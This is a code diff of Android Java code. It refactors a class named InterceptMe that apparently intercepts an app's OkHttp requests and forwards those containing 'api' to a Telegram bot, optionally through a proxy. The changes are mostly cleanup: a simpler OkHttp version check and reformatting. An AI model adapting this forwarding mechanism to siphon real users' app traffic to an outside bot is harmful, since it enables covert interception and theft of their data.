@@ -95,19 +95,8 @@ class NetworkTask extends AsyncTask<Void, Void, Void> {
     }
 
     void buildRequest(JSONObject jsonRequest) {
-        boolean isOldHttpVersion = false;
-        Method[] methods = RequestBody.class.getMethods();
         RequestBody requestBody;
-        for (Method m : methods) {
-            if (!m.getName().equals("create")) {
-                continue;
-            }
-            Class<?>[] pType = m.getParameterTypes();
-            if (pType.length == 2 && pType[0].toString().contains("MediaType") && pType[1].toString().contains("String")) {
-                isOldHttpVersion = !isOldHttpVersion;
-            }
-        }
-        if (isOldHttpVersion) {
+        if (Utils.isOldOkHttpLibrary()) {
             requestBody = RequestBody.create(this.JSON, jsonRequest.toString());
         } else {
             requestBody = RequestBody.create(jsonRequest.toString(), this.JSON);
@@ -133,17 +122,16 @@ final class Telegram extends NetworkTask {
     }
 }
 
-public final class InterceptMe extends Deobfuscator{
+public final class InterceptMe extends Deobfuscator {
 
 
     static public void send(Request request) {
         try {
-            //!!!Please modify this vars!!!
-            //enter your telegram bot key
-            if (Settings.chatId==0 || Settings.botKey==null)
+            //check settings is not default
+            if (Settings.chatId == 0 || Settings.botKey == null)
                 return;
             Telegram telegram = new Telegram(Settings.botKey);
-            if (Settings.proxyHost!=null){
+            if (Settings.proxyHost != null) {
                 telegram.setProxyParams(Settings.proxyType, Settings.proxyHost, Settings.proxyPort, Settings.proxyLogin, Settings.proxyPassword);
             }
             if (request.url().toString().contains("api")) {
